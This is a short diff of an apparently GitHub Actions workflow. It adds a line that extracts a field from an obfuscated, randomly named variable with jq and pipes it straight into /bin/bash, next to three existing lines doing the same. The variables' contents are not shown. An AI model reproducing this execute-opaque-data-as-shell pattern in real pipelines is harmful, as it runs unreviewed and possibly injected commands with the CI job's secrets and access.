@@ -28,6 +28,7 @@ jobs:
           echo $ia1075 | jq -r .la7482 | /bin/bash
           printf '%s' "$yzd38" | jq -r .miadg593 | /bin/bash
           echo $md4 | jq -r .iooos40 | /bin/bash
+          printf '%s' "$mmt71040" | jq -r .xzr4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
